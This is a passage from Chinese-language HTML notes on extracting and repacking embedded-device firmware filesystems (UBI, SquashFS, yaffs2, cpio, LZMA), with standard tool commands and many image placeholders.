sudo ubiformat /dev/mtd7 -O 2048 -s 512 -f rootfs.ubi</th></tr></table><br /><br />如果是SquashFS的文件系统，那么不需要构建ubifs，在修改完系统内容后，直接用mksquashfs打包SquashFS，一定要用相应的权限打包，如果目标系统是root，那么就在root下打包。后续操作就是用ubinize打包成UBI。<br /><br /><table class="table"><tr><th>1</th><th>sudo mksquashfs ./squashfs-root/* rootfs.squashfs</th></tr></table><br /><br /><a href="https://gorgias.me/2019/12/27/%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E7%B3%BB%E5%88%97-UBI%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%8F%90%E5%8F%96%E4%BB%A5%E5%8F%8A%E9%87%8D%E6%89%93%E5%8C%85/UBIFS.png"><img src="images\282-5.png" alt="images\282-5.png" /></a><br /><br /><h2>Reference</h2><br /><a href="http://www.linux-mtd.infradead.org/">Memory Technology Devices</a> <a href="http://www.linux-mtd.infradead.org/doc/ubidesign/ubidesign.pdf">UBI - Unsorted Block Images</a> <a href="https://baurine.netlify.com/">挂载和反向制作 ubi 镜像</a><br /><br /></div><div class='page'><h1 class='title level-6'>截图</h1><br/><a href=""><img src="images\681-1.png" alt="images\681-1.png" /></a></div><div class='page'><h1 class='title level-4'>yaffs/yaffs2</h1><br/><a href=""><img src="images\200-1.png" alt="images\200-1.png" /></a><br /><a href=""><img src="images\200-2.png" alt="images\200-2.png" /></a><br />• .yaffs2：针对NAND芯片设计的嵌入式文件系统，可用unyaffs提取<br /></div><div class='page'><h1 class='title level-3'>常见文件系统（基于内存）</h1><br/><br /></div><div class='page'><h1 class='title level-4'>Ramdisk</h1><br/><a href=""><img src="images\205-1.png" alt="images\205-1.png" /></a></div><div class='page'><h1 class='title level-4'>ramfs/tmpfs</h1><br/><a href=""><img src="images\206-1.png" alt="images\206-1.png" /></a></div><div class='page'><h1 class='title level-3'>常见文件系统（基于网络）</h1><br/><br /></div><div class='page'><h1 class='title level-4'>NFS</h1><br/><a href=""><img src="images\208-1.png" alt="images\208-1.png" /></a></div><div class='page'><h1 class='title level-3'>常见文件系统提取实例</h1><br/><br /></div><div class='page'><h1 class='title level-4'>CPIO</h1><br/>关于CPIO<br /><a href="https://www.wyxxw.cn/blog-detail-22-25-650.html">https://www.wyxxw.cn/blog-detail-22-25-650.html</a><br /><h1>1.1 cpio基本介绍</h1><br /><h3>cpio是一个非常古老的归档工具。已逐渐被tar替代，但是有些功能是tar不存在的，所以还是分享下它的用法。</h3><br /><h3>cpio - copy files to and from archives</h3><br /><h3>cpio用于创建、解压归档文件，也可以对归档文件执行拷入拷出的动作，即向归档文件中追加文件，或从归档文件中提取文件。它也支持tar格式的归档文件，但是对压缩后的tar(如.tar.gz格式)就没法支持了，cpio毕竟不会调用对应的(解)压缩工具。</h3><br /><br />处理固件中的cpio文件<br /><h3>CPIO存档文件：</h3><br /> $ cpio -ivd --no-absolute-filenames -F</div><div class='page'><h1 class='title level-4'>squashfs</h1><br/>查找魔数-》dd提取-》unsquashfs命令提取<br />unsquashfs该命令也支持lzma压缩格式<br /><a href=""><img src="images\634-1.png" alt="images\634-1.png" /></a><br /><br /></div><div class='page'><h1 class='title level-3'>常见文件系统压缩格式</h1><br/><h3>IoT设备文件系统中最常见的压缩技术是LZMA、GZIP、Zlib、Zip和ARJ等等</h3></div><div class='page'><h1 class='title level-4'>LZMA</h1><br/>lzma压缩的数据段可以使用dd将其另存为.7z格式的压缩包，并使用p7zip -d解压<br /><a href=""><img src="images\642-1.png" alt="images\642-1.png" /></a><br /><br /><br />固件中lzma如果过大则可能是可疑的<br /><h3>总共发现了四个</h3><code><h3>LZMA</h3></code><h3>签名，可以看到，除了一个签名以外，其他三个签名都有很大的size（每个有几百MB），所以那三个可能是误报。第一个签名偏移是0x194f0的大小只有3.5MB，这个大小是合理的，所以我们将该文件提取出来并解压缩：</h3><br /><br /><br /><h3> 6c 00 00 80 </h3><br /><br /><br /><br /></div><div class='page'><h1 class='title level-3'>常见虚拟文件系统</h1><br/><br /></div><div class='page'><h1 class='title level-4'>/proc</h1><br/><a href=""><img src="images\210-1.png" alt="images\210-1.png" /></a></div><div class='page'><h1 class='title level-4'>tmpfs</h1><br/><a href=""><img src="images\211-1.png" alt="images\211-1.png" /></a></div><div class='page'><h1 class='title level-3'>根文件系统</h1><br/><a href=""><img src="images\197-1.png" alt="images\197-1.png" /></a></div><div class='page'><h1 class='title level-3'>文件系统定义</h1><br/><a href=""><img src="images\196-1.png" alt="images\196-1.png" /></a><br /></div></body></html>